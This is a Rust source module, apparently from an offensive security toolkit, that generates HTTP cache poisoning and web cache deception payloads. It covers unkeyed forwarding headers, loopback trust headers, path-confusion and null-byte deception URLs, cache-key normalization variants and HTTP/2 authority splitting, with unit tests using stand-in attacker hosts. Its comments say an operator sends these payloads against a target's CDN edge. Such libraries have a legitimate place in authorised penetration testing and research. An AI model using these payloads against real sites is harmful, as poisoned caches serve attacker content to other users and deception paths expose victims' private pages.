//! HTTP cache poisoning payload library.
//!
//! Cache poisoning is the class of attack where the attacker
//! manipulates a cache (CDN edge, proxy, origin reverse-cache) into
//! storing a response for a benign request with attacker-controlled
//! content. Future victims requesting the same cache key receive the
//! poisoned response.
//!
//! Three layers:
//!
//! 1. **Unkeyed input poisoning**. The cache key consists of `Host`
//!    + path + some headers. Inputs the cache DOESN'T key on
//!    (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`,
//!    `Forwarded`, etc.) reach the origin and influence the response
//!    body, but the cache stores under the BENIGN key.
//! 2. **Cache key normalization**. The cache normalizes path/query
//!    differently from the origin. `/admin/` (cache) and `/admin//`
//!    (origin) hit different origin endpoints but share one cache
//!    entry.
//! 3. **Web cache deception** (Omer Gil, BH 2017). `/profile/avatar.css`
//!    is served by the dynamic `profile` endpoint but cached under
//!    the `.css` extension rule → attacker fetches a victim's
//!    private content from the public cache.
//!
//! This module produces the WIRE PAYLOADS for each poisoning shape.
//! The operator wraps them in real requests against the target's
//! CDN edge and verifies via a second-fetch from a clean origin.
//!
//! Coverage:
//!
//! - X-Forwarded-Host / X-Forwarded-Scheme / X-Forwarded-Port
//! - X-Original-URL / X-Rewrite-URL (IIS / Symfony / Akamai)
//! - X-Forwarded-For with internal IP (origin trust)
//! - X-Host (Akamai)
//! - Forwarded (RFC 7239)
//! - X-Backend-Host
//! - X-Real-IP
//! - X-HTTP-Method-Override (cache-key on body, action on method)
//! - Web cache deception (5 extensions × N path-traversal forms)
//! - Status code poisoning (404 cached as 200)
//! - Vary header confusion (cache stores N variants based on a header
//!   the origin doesn't actually vary on)
//! - HTTP/2 header injection that translates to H1 cache-key

/// Build the `X-Forwarded-Host` poisoning header. The attacker host
/// is what the origin sees; the cache stores under the legitimate
/// Host so victims get the poisoned response.
#[must_use]
pub fn x_forwarded_host(attacker_host: &str) -> String {
    format!("X-Forwarded-Host: {attacker_host}")
}

/// Build `X-Forwarded-Scheme` to flip the origin's view from HTTPS
/// to HTTP (or vice versa). Often the origin redirects based on
/// scheme — attacker-influenced redirects get cached.
#[must_use]
pub fn x_forwarded_scheme(scheme: &str) -> String {
    format!("X-Forwarded-Scheme: {scheme}")
}

/// Build `X-Forwarded-Port`. Origin may reflect the port in
/// generated URLs (canonical link tags, redirects). Cache stores
/// under the standard port.
#[must_use]
pub fn x_forwarded_port(port: u16) -> String {
    format!("X-Forwarded-Port: {port}")
}

/// Build `X-Original-URL` / `X-Rewrite-URL`. IIS, Symfony, Akamai
/// honor these as request-target overrides while the cache keys
/// under the actual wire path.
#[must_use]
pub fn x_original_url(target_url: &str) -> String {
    format!("X-Original-URL: {target_url}")
}

/// Akamai's flavor: `X-Host`.
#[must_use]
pub fn x_host(attacker_host: &str) -> String {
    format!("X-Host: {attacker_host}")
}

/// RFC 7239 `Forwarded` header. Some CDNs trust this even when
/// they don't trust the X-Forwarded-* family.
#[must_use]
pub fn forwarded_rfc7239(attacker_host: &str, scheme: &str) -> String {
    format!("Forwarded: for=1.1.1.1;host={attacker_host};proto={scheme}")
}

/// X-Backend-Host: an origin trust trick for setups where the LB
/// has different rules for "backend" host headers.
#[must_use]
pub fn x_backend_host(attacker_host: &str) -> String {
    format!("X-Backend-Host: {attacker_host}")
}

/// X-Real-IP / X-Forwarded-For with private/loopback IP — some
/// applications grant elevated trust to loopback. Cache key isn't
/// affected.
#[must_use]
pub fn loopback_trust_header() -> String {
    "X-Real-IP: 127.0.0.1\r\nX-Forwarded-For: 127.0.0.1".to_string()
}

/// Web cache deception path: append a cacheable extension to a
/// dynamic endpoint. `/profile` is dynamic, `/profile/avatar.css`
/// is the deception payload — cache fetches and stores under .css,
/// origin serves the profile dynamically.
///
/// Returns variants across the 5 most-cached extensions.
#[must_use]
pub fn web_cache_deception_paths(dynamic_path: &str) -> Vec<String> {
    let p = dynamic_path.trim_end_matches('/');
    vec![
        format!("{p}/cache_buster.css"),
        format!("{p}/cache_buster.js"),
        format!("{p}/cache_buster.png"),
        format!("{p}/cache_buster.jpg"),
        format!("{p}/cache_buster.svg"),
        format!("{p}/.css"),
        format!("{p}/..%2fcache_buster.css"),
        format!("{p};.css"),
        format!("{p}%00.css"),
        format!("{p}%3B.css"),
        format!("{p}#.css"),
    ]
}

/// Cache key normalization disagreement payloads. Each is a URL
/// shape where the cache and origin disagree on whether two
/// requests share a key.
#[must_use]
pub fn cache_key_normalization_variants(base_path: &str) -> Vec<String> {
    let p = base_path.trim_end_matches('/');
    vec![
        // Trailing slash flip.
        format!("{p}/"),
        format!("{p}"),
        // Empty segment.
        format!("{p}//"),
        // Encoded slash.
        format!("{p}%2f"),
        // Query argument order.
        format!("{p}?a=1&b=2"),
        format!("{p}?b=2&a=1"),
        // Case sensitivity.
        format!("{p}?A=1"),
        // Fragment (most caches strip; some don't).
        format!("{p}#x"),
        // Trailing dot.
        format!("{p}/."),
        // Mixed-case path.
        format!("{}", p.to_uppercase()),
    ]
}

/// Vary header confusion. Origin sets `Vary: User-Agent` but
/// returns the same body regardless of UA. Cache stores N copies,
/// one per attacker UA — each can carry distinct poison.
#[must_use]
pub fn vary_header_confusion(vary_on: &str) -> String {
    format!("Vary: {vary_on}")
}

/// Status code poisoning. Cache stores response with 200-status
/// header but body containing 404 content (so victim sees "not
/// found" presented as successful). Operator triggers via attacker
/// header that flips the origin's branch.
#[must_use]
pub fn status_code_poison_header() -> &'static str {
    // The attacker request includes a header the origin treats as
    // "force 404" but the cache strips before storing. Result:
    // body is 404 but stored under 200.
    "X-Force-404: 1"
}

/// HTTP/2 pseudo-header injection. The `:authority` H2 pseudo can
/// be set independently from `Host`. Some H2-to-H1 translators key
/// the cache on `Host` but route the request via `:authority`.
#[must_use]
pub fn h2_authority_split(attacker_authority: &str) -> String {
    format!(":authority: {attacker_authority}")
}

/// One-shot fan-out — every cache poisoning primitive for one
/// (attacker_host, target_path). Returns ~20 variants.
#[must_use]
pub fn all_cache_poison_payloads(
    attacker_host: &str,
    target_path: &str,
) -> Vec<(&'static str, String)> {
    let mut out = vec![
        ("x-forwarded-host", x_forwarded_host(attacker_host)),
        ("x-forwarded-scheme-http", x_forwarded_scheme("http")),
        ("x-forwarded-port-8080", x_forwarded_port(8080)),
        ("x-original-url", x_original_url("/admin")),
        ("x-host-akamai", x_host(attacker_host)),
        (
            "forwarded-rfc7239",
            forwarded_rfc7239(attacker_host, "https"),
        ),
        ("x-backend-host", x_backend_host(attacker_host)),
        ("loopback-trust", loopback_trust_header()),
        ("vary-cookie", vary_header_confusion("Cookie")),
        ("vary-ua", vary_header_confusion("User-Agent")),
        ("status-404-as-200", status_code_poison_header().to_string()),
        ("h2-authority-split", h2_authority_split(attacker_host)),
    ];
    // Add cache-deception path variants — they're URL forms not
    // headers, but join into the variant set for completeness.
    for (i, p) in web_cache_deception_paths(target_path).into_iter().enumerate() {
        out.push((
            match i {
                0 => "deception-css",
                1 => "deception-js",
                2 => "deception-png",
                3 => "deception-jpg",
                4 => "deception-svg",
                5 => "deception-dot-css",
                6 => "deception-traversal",
                7 => "deception-semicolon",
                8 => "deception-null-byte",
                9 => "deception-encoded-semi",
                _ => "deception-fragment",
            },
            p,
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn x_forwarded_host_basic() {
        assert_eq!(
            x_forwarded_host("attacker.example"),
            "X-Forwarded-Host: attacker.example"
        );
    }

    #[test]
    fn x_forwarded_scheme_https() {
        assert_eq!(x_forwarded_scheme("https"), "X-Forwarded-Scheme: https");
    }

    #[test]
    fn x_forwarded_port_high() {
        assert_eq!(x_forwarded_port(8443), "X-Forwarded-Port: 8443");
    }

    #[test]
    fn x_forwarded_port_max() {
        assert_eq!(x_forwarded_port(u16::MAX), "X-Forwarded-Port: 65535");
    }

    #[test]
    fn x_original_url_basic() {
        assert_eq!(
            x_original_url("/admin"),
            "X-Original-URL: /admin"
        );
    }

    #[test]
    fn x_host_akamai() {
        assert_eq!(x_host("evil.com"), "X-Host: evil.com");
    }

    #[test]
    fn forwarded_rfc7239_format() {
        let h = forwarded_rfc7239("evil.com", "https");
        assert!(h.starts_with("Forwarded: "));
        assert!(h.contains("for=1.1.1.1"));
        assert!(h.contains("host=evil.com"));
        assert!(h.contains("proto=https"));
    }

    #[test]
    fn x_backend_host_basic() {
        assert_eq!(x_backend_host("evil"), "X-Backend-Host: evil");
    }

    #[test]
    fn loopback_trust_has_both_headers() {
        let h = loopback_trust_header();
        assert!(h.contains("X-Real-IP: 127.0.0.1"));
        assert!(h.contains("X-Forwarded-For: 127.0.0.1"));
    }

    #[test]
    fn web_cache_deception_paths_count() {
        let p = web_cache_deception_paths("/profile");
        assert!(p.len() >= 10);
    }

    #[test]
    fn web_cache_deception_includes_css_and_js() {
        let p = web_cache_deception_paths("/x");
        assert!(p.iter().any(|s| s.ends_with(".css")));
        assert!(p.iter().any(|s| s.ends_with(".js")));
        assert!(p.iter().any(|s| s.ends_with(".png")));
    }

    #[test]
    fn web_cache_deception_strips_trailing_slash() {
        let with_slash = web_cache_deception_paths("/x/");
        let without_slash = web_cache_deception_paths("/x");
        assert_eq!(with_slash, without_slash);
    }

    #[test]
    fn web_cache_deception_includes_semicolon_truncation() {
        let p = web_cache_deception_paths("/x");
        assert!(p.iter().any(|s| s.contains(";.css")));
    }

    #[test]
    fn web_cache_deception_includes_null_byte_truncation() {
        let p = web_cache_deception_paths("/x");
        assert!(p.iter().any(|s| s.contains("%00.css")));
    }

    #[test]
    fn cache_key_normalization_variants_count() {
        let v = cache_key_normalization_variants("/admin");
        assert!(v.len() >= 8);
    }

    #[test]
    fn cache_key_normalization_includes_case_flip() {
        let v = cache_key_normalization_variants("/admin");
        assert!(v.iter().any(|s| s.contains("ADMIN")));
    }

    #[test]
    fn cache_key_normalization_includes_query_swap() {
        let v = cache_key_normalization_variants("/x");
        assert!(v.iter().any(|s| s.contains("a=1&b=2")));
        assert!(v.iter().any(|s| s.contains("b=2&a=1")));
    }

    #[test]
    fn vary_header_basic() {
        let h = vary_header_confusion("Cookie");
        assert_eq!(h, "Vary: Cookie");
    }

    #[test]
    fn status_code_poison_constant() {
        assert_eq!(status_code_poison_header(), "X-Force-404: 1");
    }

    #[test]
    fn h2_authority_split_basic() {
        let h = h2_authority_split("evil.com");
        assert_eq!(h, ":authority: evil.com");
    }

    #[test]
    fn all_cache_poison_minimum_count() {
        let v = all_cache_poison_payloads("evil.com", "/profile");
        assert!(v.len() >= 20);
    }

    #[test]
    fn all_cache_poison_unique_names() {
        let v = all_cache_poison_payloads("e", "/p");
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), v.len());
    }

    #[test]
    fn all_cache_poison_carries_marker() {
        let v = all_cache_poison_payloads("UNIQUE_HOST", "/UNIQUE_PATH");
        let any_carries_host = v.iter().any(|(_, p)| p.contains("UNIQUE_HOST"));
        let any_carries_path = v.iter().any(|(_, p)| p.contains("UNIQUE_PATH"));
        assert!(any_carries_host);
        assert!(any_carries_path);
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_cache_poison_payloads("e", "/p");
        let b = all_cache_poison_payloads("e", "/p");
        assert_eq!(a, b);
    }

    #[test]
    fn handles_unicode_host() {
        let h = x_forwarded_host("é.攻击.com");
        assert!(h.contains("é.攻击.com"));
    }

    #[test]
    fn adversarial_long_path_no_panic() {
        let big = "/x".repeat(10_000);
        let _ = web_cache_deception_paths(&big);
        let _ = cache_key_normalization_variants(&big);
        let _ = all_cache_poison_payloads("e", &big);
    }

    #[test]
    fn forwarded_rfc7239_no_crlf() {
        let h = forwarded_rfc7239("e", "https");
        assert!(!h.contains("\r"));
        assert!(!h.contains("\n"));
    }

    #[test]
    fn x_forwarded_port_zero_renders() {
        // Some cache key bugs fire on port=0. We render the literal,
        // server is responsible for rejecting.
        let h = x_forwarded_port(0);
        assert!(h.ends_with(": 0"));
    }
}
